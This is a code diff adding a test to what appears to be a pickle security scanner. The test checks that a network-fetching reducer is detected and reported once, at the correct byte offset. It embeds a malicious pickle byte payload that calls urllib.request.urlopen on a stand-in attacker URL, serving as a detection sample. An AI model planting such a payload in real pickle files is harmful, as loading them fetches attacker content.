@@ -1823,6 +1823,31 @@ def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
     assert len(explicit_url_issues) == 1
 
 
+def test_root_raw_detectors_deduplicate_offset_network_url_reducer() -> None:
+    payload = b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR."
+    position_offset = 37
+    result = ScanResult(scanner_name="pickle")
+
+    PickleScanner()._run_root_raw_detectors(
+        payload,
+        result,
+        "offset-network-reducer.pkl",
+        position_offset=position_offset,
+        scan_binary_tail=False,
+    )
+
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert len(explicit_url_issues) == 1
+    assert explicit_url_issues[0].details["position"] == position_offset + payload.index(b"https://")
+
+
 def test_scan_stream_fails_closed_for_memo_overflow_url_reducer() -> None:
     payload = _memo_overflow_urlopen_payload()
 
